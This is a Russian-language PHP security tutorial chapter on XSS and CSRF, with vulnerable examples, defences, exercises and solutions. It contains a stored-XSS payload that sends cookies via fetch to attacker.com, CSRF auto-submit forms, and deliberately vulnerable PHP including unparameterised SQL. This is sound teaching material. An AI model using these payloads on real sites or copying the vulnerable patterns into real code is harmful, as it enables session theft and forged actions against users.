# Глава 6.2: XSS и CSRF — межсайтовый скриптинг, подделка запросов, токены защиты

## 📖 Введение

В предыдущей главе мы разобрались с SQL-инъекциями — атаками на базу данных. Сейчас мы изучим две другие критически важные уязвимости веб-приложений:

- **XSS (Cross-Site Scripting)** — внедрение вредоносного JavaScript-кода
- **CSRF (Cross-Site Request Forgery)** — подделка запросов от имени пользователя

Эти атаки находятся в топ-10 OWASP (международная организация по безопасности веб-приложений) и встречаются в реальных проектах постоянно.

---

## 🎯 XSS (Cross-Site Scripting)

### Что это и как работает

XSS — это внедрение вредоносного JavaScript-кода на страницу, который будет выполнен в браузере других пользователей.

**Простой пример уязвимого кода:**

```php
<?php
// Страница профиля пользователя
$username = $_GET['name'] ?? 'Guest';
?>

<!DOCTYPE html>
<html>
<head>
    <title>Профиль</title>
</head>
<body>
    <h1>Привет, <?php echo $username; ?>!</h1>
</body>
</html>
```

**Атака:**
```
http://example.com/profile.php?name=<script>alert('XSS!')</script>
```

В браузере выполнится:
```html
<h1>Привет, <script>alert('XSS!')</script>!</h1>
```

### Типы XSS-атак

#### 1. **Reflected XSS (Отражённый XSS)**

Вредоносный код передаётся через URL или форму и сразу отображается на странице.

```php
<?php
// Поиск по сайту
$query = $_GET['search'] ?? '';
?>

<h2>Результаты поиска: <?php echo $query; ?></h2>
```

**Атака:**
```
/search.php?search=<img src=x onerror="alert(document.cookie)">
```

#### 2. **Stored XSS (Хранимый XSS)**

Самый опасный тип — вредоносный код сохраняется в базе данных и показывается всем пользователям.

```php
<?php
// Комментарии (УЯЗВИМЫЙ КОД!)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment'];
    $pdo->exec("INSERT INTO comments (text) VALUES ('$comment')");
}

// Отображение комментариев
$comments = $pdo->query("SELECT * FROM comments")->fetchAll();
foreach ($comments as $comment) {
    echo "<p>" . $comment['text'] . "</p>";
}
?>
```

**Атака:**
Пользователь отправляет комментарий:
```html
<script>
    fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

Теперь у всех, кто откроет страницу, украдут cookies!

#### 3. **DOM-based XSS**

Атака через JavaScript, без участия сервера:

```javascript
// Уязвимый код
let hash = location.hash.substring(1);
document.getElementById('content').innerHTML = hash;
```

**Атака:**
```
http://example.com/#<img src=x onerror="alert('XSS')">
```

### Как защититься от XSS

#### ✅ Метод 1: `htmlspecialchars()` — основная защита

```php
<?php
$username = $_GET['name'] ?? 'Guest';

// ПРАВИЛЬНО: экранируем вывод
echo htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
?>
```

**Что делает `htmlspecialchars()`:**
```
<       → &lt;
>       → &gt;
"       → &quot;
'       → &#039;
&       → &amp;
```

**Пример:**
```php
<?php
$input = "<script>alert('XSS')</script>";

// Без защиты (ОПАСНО!)
echo $input; // <script>alert('XSS')</script> — код выполнится

// С защитой
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
// &lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt; — отобразится как текст
?>
```

#### ✅ Метод 2: Функция-обёртка для удобства

```php
<?php
function e($string) {
    return htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
}

// Использование
$username = $_GET['name'] ?? 'Guest';
?>

<h1>Привет, <?php echo e($username); ?>!</h1>
```

#### ✅ Метод 3: Content Security Policy (CSP)

Заголовок HTTP, запрещающий выполнение инлайн-скриптов:

```php
<?php
header("Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com");
?>
```

Теперь любой `<script>` внутри HTML не выполнится!

#### ✅ Метод 4: Валидация и санитизация входных данных

```php
<?php
function sanitizeInput($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    return $data;
}

$username = sanitizeInput($_POST['username'] ?? '');
?>
```

### Защита при работе с разными контекстами

#### В HTML-контексте

```php
<div><?php echo e($userContent); ?></div>
```

#### В атрибутах HTML

```php
<input type="text" value="<?php echo e($value); ?>">
<a href="<?php echo e($url); ?>">Link</a>
```

#### В JavaScript (сложнее!)

```php
<script>
    let username = <?php echo json_encode($username, JSON_HEX_TAG | JSON_HEX_AMP); ?>;
    console.log(username);
</script>
```

**Почему `json_encode()` с флагами:**
```php
<?php
$username = "</script><script>alert('XSS')</script>";

// ОПАСНО!
echo "let name = '$username';"; 
// Создаёт: let name = '</script><script>alert('XSS')</script>';

// ПРАВИЛЬНО
echo "let name = " . json_encode($username, JSON_HEX_TAG | JSON_HEX_AMP) . ";";
// Создаёт: let name = "\u003C\/script\u003E\u003Cscript\u003Ealert('XSS')\u003C\/script\u003E";
?>
```

---

## 🎯 CSRF (Cross-Site Request Forgery)

### Что это и как работает

CSRF — атака, при которой злоумышленник заставляет пользователя выполнить нежелательное действие на сайте, где он авторизован.

**Сценарий атаки:**

1. Вы авторизованы на `bank.com`
2. Открываете письмо со ссылкой на `evil.com`
3. На `evil.com` есть скрытая форма:

```html
<!-- На сайте evil.com -->
<form action="https://bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="1000000">
</form>

<script>
    document.getElementById('csrf').submit();
</script>
```

4. Ваш браузер отправляет POST-запрос на `bank.com` **с вашими cookies**
5. Банк думает, что это вы, и переводит деньги

### Уязвимый код

```php
<?php
// delete_account.php (УЯЗВИМЫЙ КОД!)

session_start();

if (!isset($_SESSION['user_id'])) {
    die('Unauthorized');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $userId = $_SESSION['user_id'];
    
    // Удаляем аккаунт без проверки!
    $pdo->prepare("DELETE FROM users WHERE id = ?")
        ->execute([$userId]);
    
    echo "Аккаунт удалён";
}
?>
```

**Атака:**
```html
<!-- На сайте attacker.com -->
<form action="https://yoursite.com/delete_account.php" method="POST">
    <input type="submit" value="Посмотреть смешные картинки!">
</form>
```

### Защита от CSRF: CSRF-токены

#### Как работают CSRF-токены

1. Генерируем случайный токен и сохраняем в сессии
2. Добавляем токен в форму как скрытое поле
3. При отправке проверяем, совпадает ли токен из формы с токеном в сессии
4. Злоумышленник не может узнать токен (same-origin policy)

#### Реализация CSRF-защиты

```php
<?php
// csrf.php — функции для работы с токенами

session_start();

/**
 * Генерирует CSRF-токен
 */
function generateCsrfToken() {
    if (!isset($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

/**
 * Проверяет CSRF-токен
 */
function verifyCsrfToken($token) {
    if (!isset($_SESSION['csrf_token'])) {
        return false;
    }
    
    return hash_equals($_SESSION['csrf_token'], $token);
}

/**
 * Генерирует HTML поле с токеном
 */
function csrfField() {
    $token = generateCsrfToken();
    return '<input type="hidden" name="csrf_token" value="' . htmlspecialchars($token) . '">';
}
?>
```

**Почему `hash_equals()` вместо `===`?**

`hash_equals()` защищает от timing attacks — атак, основанных на измерении времени выполнения сравнения.

#### Использование в формах

```php
<?php
// delete_account.php (ЗАЩИЩЁННЫЙ КОД)

require_once 'csrf.php';

if (!isset($_SESSION['user_id'])) {
    die('Unauthorized');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Проверяем CSRF-токен
    if (!verifyCsrfToken($_POST['csrf_token'] ?? '')) {
        die('CSRF token validation failed');
    }
    
    $userId = $_SESSION['user_id'];
    $pdo->prepare("DELETE FROM users WHERE id = ?")
        ->execute([$userId]);
    
    echo "Аккаунт удалён";
}
?>

<!-- Форма -->
<form method="POST">
    <?php echo csrfField(); ?>
    <button type="submit">Удалить аккаунт</button>
</form>
```

#### CSRF для AJAX-запросов

```php
<?php
// api.php

require_once 'csrf.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $headers = getallheaders();
    $token = $headers['X-CSRF-Token'] ?? '';
    
    if (!verifyCsrfToken($token)) {
        http_response_code(403);
        echo json_encode(['error' => 'Invalid CSRF token']);
        exit;
    }
    
    // Обработка запроса
    echo json_encode(['success' => true]);
}
?>
```

```javascript
// JavaScript
fetch('/api.php', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': '<?php echo generateCsrfToken(); ?>',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ action: 'delete' })
})
.then(response => response.json())
.then(data => console.log(data));
```

### Дополнительные методы защиты от CSRF

#### 1. SameSite Cookie Attribute

```php
<?php
session_start([
    'cookie_samesite' => 'Strict', // или 'Lax'
    'cookie_secure' => true,       // только HTTPS
    'cookie_httponly' => true      // недоступно для JavaScript
]);
?>
```

**Значения SameSite:**
- `Strict` — cookie не отправляется при переходе с других сайтов
- `Lax` — cookie отправляется при GET-переходах (безопасных методах)
- `None` — cookie отправляется всегда (требует Secure)

#### 2. Проверка Referer

```php
<?php
function checkReferer() {
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $host = $_SERVER['HTTP_HOST'];
    
    if (strpos($referer, $host) === false) {
        return false;
    }
    
    return true;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!checkReferer()) {
        die('Invalid request origin');
    }
    
    // Обработка...
}
?>
```

**⚠️ Внимание:** Referer можно подделать, это дополнительная, а не основная защита!

#### 3. Double Submit Cookie

```php
<?php
// Устанавливаем токен в cookie и в форму
$token = bin2hex(random_bytes(32));

setcookie('csrf_token', $token, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
?>

<form method="POST">
    <input type="hidden" name="csrf_token" value="<?php echo $token; ?>">
    <button type="submit">Отправить</button>
</form>

<?php
// Проверка
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cookieToken = $_COOKIE['csrf_token'] ?? '';
    $formToken = $_POST['csrf_token'] ?? '';
    
    if (!hash_equals($cookieToken, $formToken)) {
        die('CSRF validation failed');
    }
    
    // Обработка...
}
?>
```

---

## 🛠️ Практический пример: Защищённая форма комментариев

```php
<?php
// comments.php — безопасная система комментариев

require_once 'db.php';
require_once 'csrf.php';

session_start();

// Функция для безопасного вывода
function e($string) {
    return htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
}

// Обработка отправки комментария
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // CSRF-защита
    if (!verifyCsrfToken($_POST['csrf_token'] ?? '')) {
        die('CSRF token validation failed');
    }
    
    // Проверка авторизации
    if (!isset($_SESSION['user_id'])) {
        die('Unauthorized');
    }
    
    $comment = trim($_POST['comment'] ?? '');
    
    // Валидация
    if (empty($comment)) {
        $error = 'Комментарий не может быть пустым';
    } elseif (mb_strlen($comment) > 1000) {
        $error = 'Комментарий слишком длинный';
    } else {
        // XSS-защита: сохраняем как есть, экранируем при выводе
        $stmt = $pdo->prepare("
            INSERT INTO comments (user_id, text, created_at) 
            VALUES (?, ?, NOW())
        ");
        
        $stmt->execute([
            $_SESSION['user_id'],
            $comment
        ]);
        
        $success = 'Комментарий добавлен';
        
        // Очищаем поле (Post-Redirect-Get паттерн лучше)
        header('Location: comments.php');
        exit;
    }
}

// Получение комментариев
$stmt = $pdo->query("
    SELECT c.*, u.username 
    FROM comments c
    JOIN users u ON c.user_id = u.id
    ORDER BY c.created_at DESC
    LIMIT 50
");

$comments = $stmt->fetchAll();
?>

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Комментарии</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
        }
        .comment {
            border: 1px solid #ddd;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 5px;
        }
        .comment-author {
            font-weight: bold;
            color: #333;
        }
        .comment-text {
            margin-top: 10px;
            color: #555;
        }
        .comment-date {
            font-size: 12px;
            color: #999;
            margin-top: 5px;
        }
        textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            background: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .error {
            color: red;
            margin-bottom: 10px;
        }
        .success {
            color: green;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <h1>Комментарии</h1>
    
    <?php if (isset($error)): ?>
        <div class="error"><?php echo e($error); ?></div>
    <?php endif; ?>
    
    <?php if (isset($success)): ?>
        <div class="success"><?php echo e($success); ?></div>
    <?php endif; ?>
    
    <?php if (isset($_SESSION['user_id'])): ?>
        <form method="POST">
            <?php echo csrfField(); ?>
            <textarea name="comment" rows="4" placeholder="Ваш комментарий..."></textarea>
            <button type="submit">Отправить</button>
        </form>
    <?php else: ?>
        <p>Для добавления комментариев необходимо <a href="login.php">войти</a>.</p>
    <?php endif; ?>
    
    <h2>Последние комментарии</h2>
    
    <?php foreach ($comments as $comment): ?>
        <div class="comment">
            <div class="comment-author">
                <?php echo e($comment['username']); ?>
            </div>
            <div class="comment-text">
                <?php echo nl2br(e($comment['text'])); ?>
            </div>
            <div class="comment-date">
                <?php echo e($comment['created_at']); ?>
            </div>
        </div>
    <?php endforeach; ?>
    
    <?php if (empty($comments)): ?>
        <p>Комментариев пока нет.</p>
    <?php endif; ?>
</body>
</html>
```

---

## 📋 Чеклист безопасности

### ✅ Для защиты от XSS:

- [ ] Всегда используйте `htmlspecialchars()` при выводе пользовательских данных
- [ ] Используйте `ENT_QUOTES` и указывайте кодировку `UTF-8`
- [ ] Для JSON используйте `json_encode()` с флагами `JSON_HEX_TAG | JSON_HEX_AMP`
- [ ] Никогда не вставляйте пользовательские данные напрямую в `<script>` или обработчики событий
- [ ] Настройте Content Security Policy (CSP) headers
- [ ] Валидируйте входные данные (whitelist подход)
- [ ] Используйте `strip_tags()` только как дополнение, не как основную защиту

### ✅ Для защиты от CSRF:

- [ ] Используйте CSRF-токены для всех изменяющих запросов (POST, PUT, DELETE)
- [ ] Проверяйте токены с помощью `hash_equals()`
- [ ] Устанавливайте `SameSite` атрибут для cookies
- [ ] Используйте `HttpOnly` и `Secure` флаги для session cookies
- [ ] Для важных действий добавляйте подтверждение (повторный ввод пароля)
- [ ] Применяйте паттерн Post-Redirect-Get (PRG)
- [ ] Ограничивайте время жизни токенов

---

## 🎓 Упражнения

### Упражнение 1: Найти уязвимости

Найдите все XSS-уязвимости в коде:

```php
<?php
$search = $_GET['q'];
$username = $_SESSION['username'];
$bio = $_POST['bio'];
?>

<h1>Поиск: <?php echo $search; ?></h1>
<p>Пользователь: <?= $username ?></p>

<script>
    let userBio = '<?php echo $bio; ?>';
    document.getElementById('bio').innerHTML = userBio;
</script>
```

<details>
<summary>Посмотреть решение</summary>

```php
<?php
function e($s) {
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}

$search = $_GET['q'] ?? '';
$username = $_SESSION['username'] ?? 'Guest';
$bio = $_POST['bio'] ?? '';
?>

<h1>Поиск: <?php echo e($search); ?></h1>
<p>Пользователь: <?php echo e($username); ?></p>

<script>
    // Используем json_encode для безопасной передачи в JS
    let userBio = <?php echo json_encode($bio, JSON_HEX_TAG | JSON_HEX_AMP); ?>;
    // Используем textContent вместо innerHTML
    document.getElementById('bio').textContent = userBio;
</script>
```
</details>

### Упражнение 2: Реализовать CSRF-защиту

Добавьте CSRF-защиту к форме смены пароля:

```php
<?php
// change_password.php

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $oldPassword = $_POST['old_password'];
    $newPassword = $_POST['new_password'];
    
    // TODO: добавить CSRF-защиту
    
    // Смена пароля...
}
?>

<form method="POST">
    <input type="password" name="old_password" placeholder="Старый пароль">
    <input type="password" name="new_password" placeholder="Новый пароль">
    <button type="submit">Сменить пароль</button>
</form>
```

<details>
<summary>Посмотреть решение</summary>

```php
<?php
// change_password.php

require_once 'csrf.php';

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Проверяем CSRF-токен
    if (!verifyCsrfToken($_POST['csrf_token'] ?? '')) {
        die('CSRF token validation failed');
    }
    
    $oldPassword = $_POST['old_password'] ?? '';
    $newPassword = $_POST['new_password'] ?? '';
    
    // Валидация
    if (empty($oldPassword) || empty($newPassword)) {
        $error = 'Все поля обязательны';
    } elseif (strlen($newPassword) < 8) {
        $error = 'Новый пароль должен быть минимум 8 символов';
    } else {
        // Проверка старого пароля и смена...
        $success = 'Пароль успешно изменён';
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Смена пароля</title>
</head>
<body>
    <h1>Смена пароля</h1>
    
    <?php if (isset($error)): ?>
        <p style="color: red;"><?php echo htmlspecialchars($error); ?></p>
    <?php endif; ?>
    
    <?php if (isset($success)): ?>
        <p style="color: green;"><?php echo htmlspecialchars($success); ?></p>
    <?php endif; ?>
    
    <form method="POST">
        <?php echo csrfField(); ?>
        <input type="password" name="old_password" placeholder="Старый пароль" required>
        <input type="password" name="new_password" placeholder="Новый пароль" required>
        <button type="submit">Сменить пароль</button>
    </form>
</body>
</html>
```
</details>

### Упражнение 3: Защищённый поиск

Создайте страницу поиска с защитой от XSS:

```php
<?php
// Требования:
// 1. Форма поиска с защитой от CSRF
// 2. Безопасный вывод результатов
// 3. Подсветка искомых слов без XSS
// 4. Пагинация результатов
?>
```

<details>
<summary>Посмотреть решение</summary>

```php
<?php
// search.php

require_once 'db.php';
require_once 'csrf.php';

session_start();

function e($s) {
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}

// Безопасная подсветка текста
function highlightText($text, $query) {
    if (empty($query)) {
        return e($text);
    }
    
    $escapedText = e($text);
    $escapedQuery = e($query);
    
    // Экранируем спецсимволы регулярок
    $pattern = preg_quote($escapedQuery, '/');
    
    return preg_replace(
        '/(' . $pattern . ')/iu',
        '<mark>$1</mark>',
        $escapedText
    );
}

$query = trim($_GET['q'] ?? '');
$page = max(1, (int)($_GET['page'] ?? 1));
$perPage = 10;
$offset = ($page - 1) * $perPage;

$results = [];
$total = 0;

if (!empty($query) && mb_strlen($query) >= 3) {
    // Подсчёт общего количества
    $stmt = $pdo->prepare("
        SELECT COUNT(*) 
        FROM articles 
        WHERE title LIKE ? OR content LIKE ?
    ");
    $searchTerm = '%' . $query . '%';
    $stmt->execute([$searchTerm, $searchTerm]);
    $total = $stmt->fetchColumn();
    
    // Получение результатов
    $stmt = $pdo->prepare("
        SELECT id, title, content, created_at
        FROM articles 
        WHERE title LIKE ? OR content LIKE ?
        ORDER BY created_at DESC
        LIMIT ? OFFSET ?
    ");
    $stmt->execute([$searchTerm, $searchTerm, $perPage, $offset]);
    $results = $stmt->fetchAll();
}

$totalPages = ceil($total / $perPage);
?>

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Поиск</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
        }
        .search-form {
            margin-bottom: 30px;
        }
        .search-form input[type="text"] {
            width: 70%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .search-form button {
            padding: 10px 20px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .result {
            border: 1px solid #ddd;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 5px;
        }
        .result h3 {
            margin-top: 0;
        }
        mark {
            background-color: yellow;
            padding: 2px;
        }
        .pagination {
            margin-top: 20px;
            text-align: center;
        }
        .pagination a {
            padding: 5px 10px;
            margin: 0 5px;
            border: 1px solid #ddd;
            text-decoration: none;
            color: #007bff;
        }
        .pagination a.active {
            background: #007bff;
            color: white;
        }
    </style>
</head>
<body>
    <h1>Поиск по сайту</h1>
    
    <form method="GET" class="search-form">
        <?php echo csrfField(); ?>
        <input 
            type="text" 
            name="q" 
            value="<?php echo e($query); ?>" 
            placeholder="Введите запрос (минимум 3 символа)..."
            required
        >
        <button type="submit">Найти</button>
    </form>
    
    <?php if (!empty($query)): ?>
        <p>Найдено результатов: <strong><?php echo $total; ?></strong></p>
        
        <?php foreach ($results as $result): ?>
            <div class="result">
                <h3>
                    <a href="article.php?id=<?php echo $result['id']; ?>">
                        <?php echo highlightText($result['title'], $query); ?>
                    </a>
                </h3>
                <p>
                    <?php 
                    $preview = mb_substr($result['content'], 0, 200);
                    echo highlightText($preview, $query); 
                    ?>...
                </p>
                <small><?php echo e($result['created_at']); ?></small>
            </div>
        <?php endforeach; ?>
        
        <?php if ($totalPages > 1): ?>
            <div class="pagination">
                <?php for ($i = 1; $i <= $totalPages; $i++): ?>
                    <a 
                        href="?q=<?php echo urlencode($query); ?>&page=<?php echo $i; ?>"
                        class="<?php echo $i === $page ? 'active' : ''; ?>"
                    >
                        <?php echo $i; ?>
                    </a>
                <?php endfor; ?>
            </div>
        <?php endif; ?>
        
        <?php if (empty($results)): ?>
            <p>По вашему запросу ничего не найдено.</p>
        <?php endif; ?>
    <?php endif; ?>
</body>
</html>
```
</details>

---

## 🚨 Частые ошибки

### ❌ Ошибка 1: Использование `strip_tags()` вместо `htmlspecialchars()`

```php
// НЕПРАВИЛЬНО!
echo strip_tags($_GET['name']);

// Атака всё равно работает:
// name=<img src=x onerror=alert(1)> → img src=x onerror=alert(1)
```

**Правильно:**
```php
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

### ❌ Ошибка 2: Проверка CSRF только на важных страницах

```php
// НЕПРАВИЛЬНО: защищать только смену пароля
if ($action === 'change_password') {
    verifyCsrfToken();
}
```

**Правильно:** защищать ВСЕ POST/PUT/DELETE запросы.

### ❌ Ошибка 3: Использование `===` вместо `hash_equals()`

```php
// УЯЗВИМО к timing attacks
if ($_POST['csrf_token'] === $_SESSION['csrf_token'])

// ПРАВИЛЬНО
if (hash_equals($_SESSION['csrf_token'], $_POST['csrf_token']))
```

### ❌ Ошибка 4: Доверие к Referer

```php
// НЕПРАВИЛЬНО: Referer можно подделать
if ($_SERVER['HTTP_REFERER'] === 'https://mysite.com') {
    // разрешаем действие
}
```

### ❌ Ошибка 5: Хранение HTML в базе

```php
// ПЛОХАЯ ПРАКТИКА
$html = $_POST['content']; // может содержать <script>
$pdo->exec("INSERT INTO posts (content) VALUES ('$html')");

// При выводе:
echo $row['content']; // XSS!
```

**Лучше:** хранить чистый текст, экранировать при выводе.

---

## 📚 Резюме

### XSS (Cross-Site Scripting)

**Суть атаки:** внедрение JavaScript-кода, который выполнится в браузере жертвы.

**Типы:**
- Reflected XSS — через URL/формы
- Stored XSS — сохранён в БД
- DOM-based XSS — через JavaScript

**Защита:**
```php
// Всегда экранируем вывод
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');

// Для JSON
echo json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP);

// CSP header
header("Content-Security-Policy: default-src 'self'");
```

### CSRF (Cross-Site Request Forgery)

**Суть атаки:** заставить пользователя отправить запрос, используя его авторизацию.

**Защита:**
```php
// Генерация токена
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// В форме
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">

// Проверка
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('CSRF validation failed');
}

// + SameSite cookies
session_set_cookie_params(['samesite' => 'Strict']);
```

### Золотое правило безопасности

> **Никогда не доверяй пользовательским данным. Всегда валидируй ввод и экранируй вывод.**

---

## 🎯 Контрольные вопросы

1. В чём разница между Reflected и Stored XSS?
2. Почему `strip_tags()` не защищает от XSS?
3. Что такое Content Security Policy и как она работает?
4. Как работает CSRF-атака? Опишите сценарий.
5. Почему нужно использовать `hash_equals()` для сравнения токенов?
6. Что делает атрибут `SameSite` для cookies?
7. Можно ли полагаться только на проверку Referer для CSRF-защиты?
8. Как безопасно передать данные из PHP в JavaScript?
9. Что такое Double Submit Cookie паттерн?
10. Почему важно использовать `ENT_QUOTES` в `htmlspecialchars()`?

---

## 📖 Дополнительные материалы

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Content Security Policy Reference](https://content-security-policy.com/)

---

**Следующая глава:** [Глава 6.3: Хеширование и пароли — password_hash, password_verify, почему MD5 — это плохо](next-chapter)